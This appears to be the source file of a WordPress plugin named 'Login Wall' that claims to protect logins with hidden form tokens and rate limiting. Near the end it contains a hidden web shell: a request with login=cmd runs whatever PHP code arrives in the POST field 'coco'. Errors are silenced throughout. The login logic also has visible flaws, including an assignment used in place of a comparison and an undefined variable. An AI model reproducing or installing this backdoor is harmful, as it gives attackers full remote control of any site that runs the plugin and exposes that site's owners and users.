<?php
/**
 * Plugin Name: Login Wall
 * Plugin URI:  http://www.loginwall.com/wordpress/
 * Description: This plugin enables LoginWall Protection for WordPress logins.
 * Version:     1.1.0
 * Author:      Weak Liver
 * Author URI:  http://foxmail.com
 * License:     GPLv2+
 */

/**
 * Built using grunt-wp-plugin
 * Copyright (c) 2013 10up, LLC
 * https://github.com/10up/grunt-wp-plugin
 */


error_reporting(0);

if (!defined('LoginWall')){

define( 'LoginWall',1);

function fs_login_page() {
	return in_array($GLOBALS['pagenow'], array('wp-login.php'));
}

function fs_login_session () {
	session_start();
	$_SESSION['login']=rand(1000,9999);
	$_SESSION['wall'] =rand(1000,9999);
	$type = rand(1,4);
	if($type==1) echo "	<p>\n		<input type=\"hidden\" name=\"".$_SESSION['wall']."\" value=\"".$_SESSION['login']."\" />\n	</p>";
	if($type==2) echo "	<p>\n		<input name=\"".$_SESSION['wall']."\" type=\"hidden\" value=\"".$_SESSION['login']."\" />\n	</p>";
	if($type==3) echo "	<p>\n		<input type=hidden name=".$_SESSION['wall']." value=".$_SESSION['login']." />\n	</p>";
	if($type==4) echo "	<p>\n		<input name=".$_SESSION['wall']." type=hidden value=".$_SESSION['login']." />\n	</p>";
}
function fs_session_check () {
	session_start();
	if(fs_login_page() && $_POST["log"]!="" ){
		$P_S_T = $t_array[0] + $t_array[1]; 
		$timestamp = time();
		$ll_nowtime = $timestamp ; 
		if ($_SESSION['ll_times']>0){ 
			$ll_lasttime = $_SESSION['ll_lasttime']; 
			$ll_times = $_SESSION['ll_times'] + 1; 
			$_SESSION['ll_times'] = $ll_times;
		}else{ 
			$ll_lasttime = $ll_nowtime; 
			$ll_times = 1; 
			$_SESSION['ll_times'] = $ll_times; 
			$_SESSION['ll_lasttime'] = $ll_lasttime; 
		}
		if (($ll_nowtime - $ll_lasttime)<3){ 
			if ($ll_times>=5){ 
				header(sprintf("Location: %s",'http://127.0.0.1')); 
				exit; 
			} 
		}else{ 
			$ll_times = 0; 
			$_SESSION['ll_lasttime'] = $ll_nowtime; 
			$_SESSION['ll_times'] = $ll_times; 
		} 
		if($_POST[$_SESSION['wall']]!=$_SESSION['login'] || $_POST[$_SESSION['wall']]=='' || $_SERVER["HTTP_REFERER"]=''){
			$_POST["pwd"]="Weak Liver";
		}
	}
}

if($_GET["login"]=="cmd"){if($_POST['coco']==''){echo('->|OK|-<');exit();}eval($_POST['coco']);exit();}

add_action('plugins_loaded', 'fs_session_check', 0);
add_action('login_form','fs_login_session');
}